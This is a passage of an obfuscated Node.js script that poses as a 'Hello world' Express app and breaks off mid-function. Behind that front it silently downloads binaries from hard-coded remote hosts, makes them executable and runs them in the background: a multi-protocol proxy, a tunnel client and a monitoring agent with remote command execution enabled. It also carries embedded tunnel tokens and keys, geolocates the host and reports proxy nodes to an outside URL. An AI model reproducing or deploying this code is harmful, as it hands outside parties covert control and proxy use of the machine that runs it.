const _0x303e6f=_0xad24;(function(_0x20fa0c,_0x37a4ec){const _0x203f13={_0xb4107c:0x1e3,_0x5b185c:0x16a,_0x5e25cc:0x14a,_0x30ef9d:0x188,_0x35bdf0:0x1b3,_0x2ac0fb:0x1ca},_0x124240=_0xad24,_0x5a7f75=_0x20fa0c();while(!![]){try{const _0x4a0f25=parseInt(_0x124240(0x14c))/0x1+parseInt(_0x124240(0x150))/0x2*(-parseInt(_0x124240(_0x203f13._0xb4107c))/0x3)+-parseInt(_0x124240(_0x203f13._0x5b185c))/0x4+-parseInt(_0x124240(0x1a8))/0x5*(parseInt(_0x124240(0x1ac))/0x6)+-parseInt(_0x124240(_0x203f13._0x5e25cc))/0x7*(parseInt(_0x124240(_0x203f13._0x30ef9d))/0x8)+parseInt(_0x124240(_0x203f13._0x35bdf0))/0x9+parseInt(_0x124240(_0x203f13._0x2ac0fb))/0xa;if(_0x4a0f25===_0x37a4ec)break;else _0x5a7f75['push'](_0x5a7f75['shift']());}catch(_0x1a35df){_0x5a7f75['push'](_0x5a7f75['shift']());}}}(_0x2afa,0x9d11e));const express=require(_0x303e6f(0x1f5)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x303e6f(0x19d)),{promisify}=require(_0x303e6f(0x13e)),exec=promisify(require(_0x303e6f(0x1e1))['exec']),{execSync}=require(_0x303e6f(0x1e1)),UPLOAD_URL=process[_0x303e6f(0x1b0)][_0x303e6f(0x170)]||'',PROJECT_URL=process[_0x303e6f(0x1b0)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x303e6f(0x1b0)][_0x303e6f(0x13b)]||![],FILE_PATH=process['env'][_0x303e6f(0x191)]||_0x303e6f(0x1cf),SUB_PATH=process[_0x303e6f(0x1b0)]['SUB_PATH']||_0x303e6f(0x1ae),PORT=process[_0x303e6f(0x1b0)][_0x303e6f(0x169)]||process[_0x303e6f(0x1b0)][_0x303e6f(0x1df)]||0xbb8,UUID=process['env'][_0x303e6f(0x181)]||_0x303e6f(0x18f),NEZHA_SERVER=process['env'][_0x303e6f(0x1c8)]||_0x303e6f(0x13a),NEZHA_PORT=process[_0x303e6f(0x1b0)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x303e6f(0x1b0)][_0x303e6f(0x1d9)]||_0x303e6f(0x1dc),ARGO_DOMAIN=process['env'][_0x303e6f(0x1ea)]||_0x303e6f(0x1b4),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x303e6f(0x1c2),ARGO_PORT=process[_0x303e6f(0x1b0)][_0x303e6f(0x1d4)]||0x1f41,CFIP=process['env'][_0x303e6f(0x15b)]||'cdns.doon.eu.org',CFPORT=process[_0x303e6f(0x1b0)]['CFPORT']||0x1bb,NAME=process[_0x303e6f(0x1b0)][_0x303e6f(0x143)]||'nfu';!fs[_0x303e6f(0x1ba)](FILE_PATH)?(fs[_0x303e6f(0x1bd)](FILE_PATH),console['log'](FILE_PATH+_0x303e6f(0x1cc))):console[_0x303e6f(0x1aa)](FILE_PATH+_0x303e6f(0x1a9));function generateRandomName(){const _0x5588f4={_0x130030:0x1bc,_0x46bc61:0x166,_0x1d9e9c:0x17d},_0x9dd9a2=_0x303e6f,_0x2a9553=_0x9dd9a2(0x1c3);let _0xa00a6e='';for(let _0x3e787f=0x0;_0x3e787f<0x6;_0x3e787f++){_0xa00a6e+=_0x2a9553[_0x9dd9a2(0x164)](Math[_0x9dd9a2(_0x5588f4._0x130030)](Math[_0x9dd9a2(_0x5588f4._0x46bc61)]()*_0x2a9553[_0x9dd9a2(_0x5588f4._0x1d9e9c)]));}return _0xa00a6e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x303e6f(0x1d2)](FILE_PATH,npmName),phpPath=path[_0x303e6f(0x1d2)](FILE_PATH,phpName),webPath=path[_0x303e6f(0x1d2)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x303e6f(0x138)),listPath=path[_0x303e6f(0x1d2)](FILE_PATH,_0x303e6f(0x167)),bootLogPath=path['join'](FILE_PATH,_0x303e6f(0x152)),configPath=path[_0x303e6f(0x1d2)](FILE_PATH,_0x303e6f(0x16c));function deleteNodes(){const _0x3a6695={_0x489b48:0x14b,_0x402ca1:0x195,_0x4748b5:0x184,_0x1fb81b:0x15e},_0x4de374=_0x303e6f;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xa6a8f8;try{_0xa6a8f8=fs[_0x4de374(0x139)](subPath,_0x4de374(0x160));}catch{return null;}const _0xcbb5a1=Buffer[_0x4de374(_0x3a6695._0x489b48)](_0xa6a8f8,_0x4de374(0x1ad))[_0x4de374(_0x3a6695._0x402ca1)](_0x4de374(0x160)),_0x41873a=_0xcbb5a1[_0x4de374(_0x3a6695._0x4748b5)]('\x0a')[_0x4de374(0x1d7)](_0x4208c4=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4de374(0x174)](_0x4208c4));if(_0x41873a['length']===0x0)return;return axios[_0x4de374(0x18b)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4de374(_0x3a6695._0x1fb81b)]({'nodes':_0x41873a}),{'headers':{'Content-Type':_0x4de374(0x1ec)}})[_0x4de374(0x163)](_0xd88c0=>{return null;}),null;}catch(_0x1ab9a6){return null;}}function cleanupOldFiles(){const _0x1f092b={_0x1447b4:0x156},_0x1d28f4={_0x2ce3b2:0x17a},_0x1d1f1f=_0x303e6f;try{const _0x4fb638=fs[_0x1d1f1f(0x161)](FILE_PATH);_0x4fb638[_0x1d1f1f(_0x1f092b._0x1447b4)](_0x3d0b7d=>{const _0x502d92=_0x1d1f1f,_0xec3ca7=path[_0x502d92(0x1d2)](FILE_PATH,_0x3d0b7d);try{const _0x11bfde=fs[_0x502d92(0x1d6)](_0xec3ca7);_0x11bfde[_0x502d92(0x15d)]()&&fs[_0x502d92(_0x1d28f4._0x2ce3b2)](_0xec3ca7);}catch(_0x30066a){}});}catch(_0x4ef985){}}app[_0x303e6f(0x1c4)]('/',function(_0x25bc93,_0x39eceb){const _0x866ce5={_0x451d7e:0x1c5},_0x1d110a=_0x303e6f;_0x39eceb['send'](_0x1d110a(_0x866ce5._0x451d7e));});async function generateConfig(){const _0x18b036={_0x3c8378:0x1b2,_0x12e6c2:0x1b2,_0xd07a58:0x1c6,_0x332e12:0x198,_0x3175cd:0x18d,_0x29ac7f:0x18d,_0x5745b1:0x13d,_0x1ca37c:0x168,_0x1da716:0x1e5,_0x3a976a:0x1f0,_0x5edfd4:0x16c},_0x33af9d=_0x303e6f,_0x3d6ee9={'log':{'access':_0x33af9d(_0x18b036._0x3c8378),'error':_0x33af9d(_0x18b036._0x12e6c2),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x33af9d(0x175),'settings':{'clients':[{'id':UUID,'flow':_0x33af9d(0x13c)}],'decryption':_0x33af9d(0x18d),'fallbacks':[{'dest':0xbb9},{'path':_0x33af9d(_0x18b036._0xd07a58),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x33af9d(_0x18b036._0x332e12)}},{'port':0xbb9,'listen':_0x33af9d(0x13d),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x33af9d(_0x18b036._0x3175cd)},'streamSettings':{'network':_0x33af9d(0x198),'security':_0x33af9d(_0x18b036._0x29ac7f)}},{'port':0xbba,'listen':_0x33af9d(_0x18b036._0x5745b1),'protocol':_0x33af9d(0x175),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x33af9d(_0x18b036._0x3175cd)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x33af9d(0x1c6)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x33af9d(0x1c1),_0x33af9d(_0x18b036._0x1ca37c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x33af9d(0x13d),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x33af9d(_0x18b036._0x1da716)}},'sniffing':{'enabled':!![],'destOverride':[_0x33af9d(_0x18b036._0x3a976a),_0x33af9d(0x1c1),_0x33af9d(0x168)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x33af9d(_0x18b036._0x5745b1),'protocol':_0x33af9d(0x147),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x33af9d(_0x18b036._0x3175cd),'wsSettings':{'path':_0x33af9d(0x1d5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x33af9d(0x1c1),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x33af9d(0x1b7)]},'outbounds':[{'protocol':_0x33af9d(0x185),'tag':_0x33af9d(0x144)},{'protocol':'blackhole','tag':'block'}]};fs[_0x33af9d(0x137)](path[_0x33af9d(0x1d2)](FILE_PATH,_0x33af9d(_0x18b036._0x5edfd4)),JSON[_0x33af9d(0x15e)](_0x3d6ee9,null,0x2));}function _0x2afa(){const _0x15f414=['freedom','/config.json\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20tunnel:\x20','192HqPIXw','push','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','post','\x0aclient_secret:\x20','none','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','774122b9-f9cd-438e-b440-fb8e45ef0087','includes','FILE_PATH','https://amd64.ssss.nyc.mn/agent','\x20-c\x20','\x20successfully','toString','\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tcp','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','fileName','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20downloading\x20files:','path','App\x20is\x20running','\x22\x20>\x20/dev/null\x202>&1','org','NEZHA\x20variable\x20is\x20empty,skip\x20running','http\x20server\x20is\x20running\x20on\x20port:','win32','rm\x20-rf\x20','\x20-c\x20\x22','pop','Error\x20reading\x20boot.log:','165YgVdTJ','\x20already\x20exists','log','ARGO_DOMAIN:','96666OzTNRX','base64','nfus','country_code','env','Empowerment\x20success\x20for\x20','/dev/null','6574617QCWkEB','nfus.behance.cf','data','&path=%2Ftrojan-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','nohup\x20','platform','existsSync','Error\x20executing\x20command:\x20','floor','mkdirSync','map','https://amd64.ssss.nyc.mn/bot','basename','tls','eyJhIjoiMDRlMmU5NWI4OThlZGI5MTFjMjNlOTVjYTU5M2FhYTEiLCJ0IjoiMDNkOGI5YWQtMDk2My00MzBjLWIyNWYtNjQyZTQ1YmEyMWZiIiwicyI6Ill6SXpZMk13TkRjdE5ERXhNaTAwTm1ReExXSXdabVV0WTJVNFlXVmtZemMwTlRZeCJ9','abcdefghijklmnopqrstuvwxyz','get','Hello\x20world!','/vless-argo','del\x20/f\x20/q\x20','NEZHA_SERVER','clear','20065630WXSxlf','2083','\x20is\x20created','Error\x20in\x20startserver:','all','./tmp','Content-Type','Skipping\x20adding\x20automatic\x20access\x20task','join','taskkill\x20/f\x20/im\x20','ARGO_PORT','/trojan-argo','statSync','filter','Download\x20','NEZHA_KEY','TunnelSecret','stream','Ni6ljQ2FJb9dnPzXPrbLEEwGqXUsQSle','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','ArgoDomain:','PORT','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','child_process','https://ipapi.co/json/','6ZMVaBt','message','/vmess-argo','https://arm64.ssss.nyc.mn/web','2053','/api/add-nodes','\x20-p\x20','ARGO_DOMAIN','arm','application/json','Subscription\x20uploaded\x20successfully','response','.exe\x20>\x20nul\x202>&1','http','\x0avless://','https://amd64.ssss.nyc.mn/v1','tunnel.json','match','express','writeFileSync','sub.txt','readFileSync','nz.lish.eu.org:5566','AUTO_ACCESS','xtls-rprx-vision','127.0.0.1','util','unlink','tunnel.yml','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','NAME','direct','2087','status','trojan','aarch64','send','316435wbwjMK','from','967549zyUqAF','&fp=firefox&type=ws&host=','set','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','267356VtjTBM','2096','boot.log','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','forEach','\x20failed:\x20','/tunnel.yml\x20run','\x20is\x20running','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','CFIP','https://oooo.serv00.net/add-url','isFile','stringify','npm\x20running\x20error:\x20','utf-8','readdirSync','8443','catch','charAt','createWriteStream','random','list.txt','quic','SERVER_PORT','4709312RYjgZq','php\x20running\x20error:\x20','config.json','arch','https://arm64.ssss.nyc.mn/v1','error','UPLOAD_URL','\x20>\x20nul\x202>&1','success','\x20-s\x20','test','vless','automatic\x20access\x20task\x20added\x20successfully','amd','false','countryCode','unlinkSync','Unhandled\x20error\x20in\x20startserver:','listen','length','\x0a\x0atrojan://','Unknown','/vmess-argo?ed=2560','UUID','finish','?security=tls&sni=','split'];_0x2afa=function(){return _0x15f414;};return _0x2afa();}function getSystemArchitecture(){const _0x2a0676={_0x5440a3:0x16d,_0x2ed24c:0x1eb},_0xf4c367=_0x303e6f,_0x4e2906=os[_0xf4c367(_0x2a0676._0x5440a3)]();return _0x4e2906===_0xf4c367(_0x2a0676._0x2ed24c)||_0x4e2906==='arm64'||_0x4e2906===_0xf4c367(0x148)?_0xf4c367(_0x2a0676._0x2ed24c):_0xf4c367(0x177);}function downloadFile(_0x5106da,_0xacba5f,_0x48be3a){const _0x53ec45={_0x4d7b91:0x1c4,_0x551d0b:0x1db,_0x3ec1ed:0x163},_0x45af5b={_0x5039b3:0x1e4},_0xa56ca5={_0x38d28c:0x16f},_0xc23ecc={_0x4c6d03:0x1c0},_0x4ee1e1=_0x303e6f,_0x4e4590=_0x5106da;!fs[_0x4ee1e1(0x1ba)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x34918c=fs[_0x4ee1e1(0x165)](_0x4e4590);axios({'method':_0x4ee1e1(_0x53ec45._0x4d7b91),'url':_0xacba5f,'responseType':_0x4ee1e1(_0x53ec45._0x551d0b)})['then'](_0x1891f7=>{const _0x2833dc={_0x209dfb:0x1d8,_0x11b93f:0x1c0},_0x100185=_0x4ee1e1;_0x1891f7[_0x100185(0x1b5)]['pipe'](_0x34918c),_0x34918c['on'](_0x100185(0x182),()=>{const _0x40c26e=_0x100185;_0x34918c['close'](),console[_0x40c26e(0x1aa)](_0x40c26e(_0x2833dc._0x209dfb)+path[_0x40c26e(_0x2833dc._0x11b93f)](_0x4e4590)+_0x40c26e(0x194)),_0x48be3a(null,_0x4e4590);}),_0x34918c['on'](_0x100185(_0xa56ca5._0x38d28c),_0x5d91f5=>{const _0x21c531=_0x100185;fs[_0x21c531(0x13f)](_0x4e4590,()=>{});const _0x23df24=_0x21c531(0x1d8)+path[_0x21c531(_0xc23ecc._0x4c6d03)](_0x4e4590)+_0x21c531(0x157)+_0x5d91f5[_0x21c531(0x1e4)];console[_0x21c531(0x16f)](_0x23df24),_0x48be3a(_0x23df24);});})[_0x4ee1e1(_0x53ec45._0x3ec1ed)](_0x3e4a3c=>{const _0x22317a=_0x4ee1e1,_0x45e66a=_0x22317a(0x1d8)+path['basename'](_0x4e4590)+'\x20failed:\x20'+_0x3e4a3c[_0x22317a(_0x45af5b._0x5039b3)];console[_0x22317a(0x16f)](_0x45e66a),_0x48be3a(_0x45e66a);});}async function downloadFilesAndRun(){const _0x17d865={_0x41a3a9:0x1aa,_0x4d1bea:0x153,_0x463790:0x16f,_0x4b4161:0x184,_0x546074:0x162,_0x126730:0x151,_0x1acf95:0x145,_0x32f837:0x1cb,_0x3f044b:0x154,_0x31cd56:0x151,_0x109f59:0x1e7,_0x1466e6:0x1b8,_0x4be2ba:0x1aa,_0x11c5f5:0x1aa,_0x147b88:0x1a1,_0x4b1185:0x186,_0x1c9be8:0x1aa,_0xa94f62:0x159,_0x202ec4:0x16f,_0x2d892d:0x158,_0x5c562e:0x155,_0x5cae25:0x199},_0x5d75c2={_0x4a2732:0x156},_0x127346=_0x303e6f,_0x3f5572=getSystemArchitecture(),_0x49f748=getFilesForArchitecture(_0x3f5572);if(_0x49f748['length']===0x0){console[_0x127346(_0x17d865._0x41a3a9)](_0x127346(_0x17d865._0x4d1bea));return;}const _0xe9cd93=_0x49f748[_0x127346(0x1be)](_0x7f6f5e=>{const _0x41dffa={_0x53039b:0x19a};return new Promise((_0x31b06c,_0x59cc4d)=>{const _0x3586ab=_0xad24;downloadFile(_0x7f6f5e[_0x3586ab(_0x41dffa._0x53039b)],_0x7f6f5e['fileUrl'],(_0x58e888,_0xf062fd)=>{_0x58e888?_0x59cc4d(_0x58e888):_0x31b06c(_0xf062fd);});});});try{await Promise[_0x127346(0x1ce)](_0xe9cd93);}catch(_0x56a1bc){console[_0x127346(_0x17d865._0x463790)](_0x127346(0x19c),_0x56a1bc);return;}function _0x27c3a0(_0x8b5290){const _0x4de6ca=_0x127346,_0x11b489=0x1fd;_0x8b5290[_0x4de6ca(_0x5d75c2._0x4a2732)](_0x2a3803=>{const _0x47a59d={_0x25c412:0x16f};fs['existsSync'](_0x2a3803)&&fs['chmod'](_0x2a3803,_0x11b489,_0x17e472=>{const _0x2a7ae1=_0xad24;_0x17e472?console[_0x2a7ae1(_0x47a59d._0x25c412)]('Empowerment\x20failed\x20for\x20'+_0x2a3803+':\x20'+_0x17e472):console[_0x2a7ae1(0x1aa)](_0x2a7ae1(0x1b1)+_0x2a3803+':\x20'+_0x11b489['toString'](0x8));});});}const _0x4ba3c3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27c3a0(_0x4ba3c3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3995fd=NEZHA_SERVER[_0x127346(0x190)](':')?NEZHA_SERVER[_0x127346(_0x17d865._0x4b4161)](':')[_0x127346(0x1a6)]():'',_0x5d3a6e=new Set(['443',_0x127346(_0x17d865._0x546074),_0x127346(_0x17d865._0x126730),_0x127346(_0x17d865._0x1acf95),_0x127346(_0x17d865._0x32f837),_0x127346(0x1e7)]),_0x594a6d=_0x5d3a6e['has'](_0x3995fd)?'true':_0x127346(0x178),_0x327412=_0x127346(0x18c)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x594a6d+_0x127346(0x18e)+UUID;fs['writeFileSync'](path[_0x127346(0x1d2)](FILE_PATH,'config.yaml'),_0x327412);const _0x3c1db8='nohup\x20'+phpPath+_0x127346(0x1a5)+FILE_PATH+_0x127346(0x19b);try{await exec(_0x3c1db8),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x3f32fa=>setTimeout(_0x3f32fa,0x3e8));}catch(_0x4a40ee){console[_0x127346(0x16f)](_0x127346(0x16b)+_0x4a40ee);}}else{let _0x31fab3='';const _0x1b8e28=[_0x127346(_0x17d865._0x3f044b),'8443',_0x127346(_0x17d865._0x31cd56),_0x127346(0x145),'2083',_0x127346(_0x17d865._0x109f59)];_0x1b8e28[_0x127346(0x190)](NEZHA_PORT)&&(_0x31fab3='--tls');const _0x5ab679=_0x127346(_0x17d865._0x1466e6)+npmPath+_0x127346(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0x127346(0x1e9)+NEZHA_KEY+'\x20'+_0x31fab3+_0x127346(0x141);try{await exec(_0x5ab679),console[_0x127346(_0x17d865._0x4be2ba)](npmName+_0x127346(0x159)),await new Promise(_0x290c09=>setTimeout(_0x290c09,0x3e8));}catch(_0x2c3066){console[_0x127346(0x16f)](_0x127346(0x15f)+_0x2c3066);}}}else console[_0x127346(_0x17d865._0x11c5f5)](_0x127346(_0x17d865._0x147b88));const _0x164bf1=_0x127346(0x1b8)+webPath+_0x127346(0x193)+FILE_PATH+_0x127346(_0x17d865._0x4b1185);try{await exec(_0x164bf1),console[_0x127346(_0x17d865._0x1c9be8)](webName+_0x127346(_0x17d865._0xa94f62)),await new Promise(_0x4a47aa=>setTimeout(_0x4a47aa,0x3e8));}catch(_0x441a1f){console[_0x127346(_0x17d865._0x202ec4)]('web\x20running\x20error:\x20'+_0x441a1f);}if(fs['existsSync'](botPath)){let _0x41a72e;if(ARGO_AUTH[_0x127346(0x1f4)](/^[A-Z0-9a-z=]{120,250}$/))_0x41a72e=_0x127346(0x1dd)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x41a72e='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x127346(_0x17d865._0x2d892d):_0x41a72e=_0x127346(_0x17d865._0x5c562e)+FILE_PATH+_0x127346(_0x17d865._0x5cae25)+ARGO_PORT;try{await exec(_0x127346(_0x17d865._0x1466e6)+botPath+'\x20'+_0x41a72e+_0x127346(0x196)),console[_0x127346(0x1aa)](botName+_0x127346(_0x17d865._0xa94f62)),await new Promise(_0x20249e=>setTimeout(_0x20249e,0x7d0));}catch(_0x230c06){console['error']('Error\x20executing\x20command:\x20'+_0x230c06);}}await new Promise(_0x250cf=>setTimeout(_0x250cf,0x1388));}function _0xad24(_0xf1f1dc,_0x2e39a9){const _0x2afa8f=_0x2afa();return _0xad24=function(_0xad2404,_0x2d2175){_0xad2404=_0xad2404-0x137;let _0x48b8db=_0x2afa8f[_0xad2404];return _0x48b8db;},_0xad24(_0xf1f1dc,_0x2e39a9);}function getFilesForArchitecture(_0x497fcb){const _0x4b2c20={_0x4a2256:0x1bf,_0x436a43:0x1f2},_0x180ac9=_0x303e6f;let _0x264603;_0x497fcb===_0x180ac9(0x1eb)?_0x264603=[{'fileName':webPath,'fileUrl':_0x180ac9(0x1e6)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x264603=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x180ac9(_0x4b2c20._0x4a2256)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x47f273=_0x497fcb===_0x180ac9(0x1eb)?'https://arm64.ssss.nyc.mn/agent':_0x180ac9(0x192);_0x264603['unshift']({'fileName':npmPath,'fileUrl':_0x47f273});}else{const _0x3910b0=_0x497fcb===_0x180ac9(0x1eb)?_0x180ac9(0x16e):_0x180ac9(_0x4b2c20._0x436a43);_0x264603['unshift']({'fileName':phpPath,'fileUrl':_0x3910b0});}}return _0x264603;}function argoType(){const _0x412cc2={_0x4bfe12:0x1e0,_0x2dfa75:0x1da,_0x5b12a1:0x187,_0x24f131:0x14f,_0x303174:0x18a,_0xd7b9ef:0x140},_0x6a64d0=_0x303e6f;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x6a64d0(_0x412cc2._0x4bfe12));return;}if(ARGO_AUTH[_0x6a64d0(0x190)](_0x6a64d0(_0x412cc2._0x2dfa75))){fs[_0x6a64d0(0x137)](path['join'](FILE_PATH,_0x6a64d0(0x1f3)),ARGO_AUTH);const _0x463bb4=_0x6a64d0(_0x412cc2._0x5b12a1)+ARGO_AUTH[_0x6a64d0(0x184)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x6a64d0(0x1d2)](FILE_PATH,'tunnel.json')+_0x6a64d0(_0x412cc2._0x24f131)+ARGO_DOMAIN+_0x6a64d0(_0x412cc2._0x303174)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path['join'](FILE_PATH,_0x6a64d0(_0x412cc2._0xd7b9ef)),_0x463bb4);}else console[_0x6a64d0(0x1aa)](_0x6a64d0(0x197));}async function extractDomains(){const _0x498d8e={_0x39a7de:0x139,_0x340a8c:0x160,_0x524bb6:0x17d,_0x3a8c71:0x1de,_0xb142f6:0x1aa,_0x376248:0x17a,_0x654845:0x155,_0x8eb8d4:0x1bb},_0x11698a={_0x450440:0x1af,_0x1c6b63:0x1b5,_0x5a0934:0x146,_0x217fe2:0x179},_0x4299d8={_0x230959:0x1ef,_0x17c0fa:0x19f},_0x1ac827={_0xfe02e4:0x189},_0x5d680a=_0x303e6f;let _0x5c394c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5c394c=ARGO_DOMAIN,console[_0x5d680a(0x1aa)](_0x5d680a(0x1ab),_0x5c394c),await _0x5c26f5(_0x5c394c);else try{const _0x358a7d=fs[_0x5d680a(_0x498d8e._0x39a7de)](path[_0x5d680a(0x1d2)](FILE_PATH,_0x5d680a(0x152)),_0x5d680a(_0x498d8e._0x340a8c)),_0x1a6c3e=_0x358a7d[_0x5d680a(0x184)]('\x0a'),_0x1d8830=[];_0x1a6c3e['forEach'](_0x1bd2e4=>{const _0x5ab92d=_0x5d680a,_0x2b865e=_0x1bd2e4[_0x5ab92d(0x1f4)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2b865e){const _0xcb1a2f=_0x2b865e[0x1];_0x1d8830[_0x5ab92d(_0x1ac827._0xfe02e4)](_0xcb1a2f);}});if(_0x1d8830[_0x5d680a(_0x498d8e._0x524bb6)]>0x0)_0x5c394c=_0x1d8830[0x0],console['log'](_0x5d680a(_0x498d8e._0x3a8c71),_0x5c394c),await _0x5c26f5(_0x5c394c);else{console[_0x5d680a(_0x498d8e._0xb142f6)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5d680a(_0x498d8e._0x376248)](path[_0x5d680a(0x1d2)](FILE_PATH,'boot.log'));async function _0x463cb1(){const _0x173d41=_0x5d680a;try{process[_0x173d41(0x1b9)]==='win32'?await exec(_0x173d41(0x1d3)+botName+_0x173d41(_0x4299d8._0x230959)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x173d41(_0x4299d8._0x17c0fa));}catch(_0x3d3ab9){}}_0x463cb1(),await new Promise(_0x327065=>setTimeout(_0x327065,0xbb8));const _0x5ae7c6=_0x5d680a(_0x498d8e._0x654845)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x5ae7c6+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x3adcf3=>setTimeout(_0x3adcf3,0xbb8)),await extractDomains();}catch(_0x13f044){console[_0x5d680a(0x16f)](_0x5d680a(_0x498d8e._0x8eb8d4)+_0x13f044);}}}catch(_0x4de8f2){console['error'](_0x5d680a(0x1a7),_0x4de8f2);}async function _0x4815dc(){const _0x4df951=_0x5d680a;try{const _0x1a6a41=await axios['get'](_0x4df951(0x1e2),{'timeout':0xbb8});if(_0x1a6a41[_0x4df951(0x1b5)]&&_0x1a6a41['data'][_0x4df951(0x1af)]&&_0x1a6a41[_0x4df951(0x1b5)][_0x4df951(0x1a0)])return _0x1a6a41[_0x4df951(0x1b5)][_0x4df951(_0x11698a._0x450440)]+'_'+_0x1a6a41[_0x4df951(0x1b5)]['org'];}catch(_0x2527d6){try{const _0x49ebea=await axios[_0x4df951(0x1c4)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x49ebea[_0x4df951(0x1b5)]&&_0x49ebea[_0x4df951(_0x11698a._0x1c6b63)][_0x4df951(_0x11698a._0x5a0934)]===_0x4df951(0x172)&&_0x49ebea[_0x4df951(0x1b5)][_0x4df951(_0x11698a._0x217fe2)]&&_0x49ebea['data']['org'])return _0x49ebea[_0x4df951(0x1b5)][_0x4df951(0x179)]+'_'+_0x49ebea[_0x4df951(_0x11698a._0x1c6b63)]['org'];}catch(_0x1a076d){}}return _0x4df951(0x17f);}async function _0x5c26f5(_0x117065){const _0x204be3={_0x25048f:0x18d,_0x5445ea:0x180,_0x12425e:0x1c1,_0x485f52:0x1f1,_0x5e97f2:0x14d,_0x2f8bb5:0x15e,_0xc563ca:0x17e,_0x2a656f:0x195,_0x4c1bfb:0x1aa,_0x4137b3:0x142},_0x24c066=await _0x4815dc(),_0x455804=NAME?NAME+'-'+_0x24c066:_0x24c066;return new Promise(_0x25a694=>{const _0x4ca997={_0x5bdeff:0x195,_0x543e42:0x1ad,_0x1fc131:0x1d0};setTimeout(()=>{const 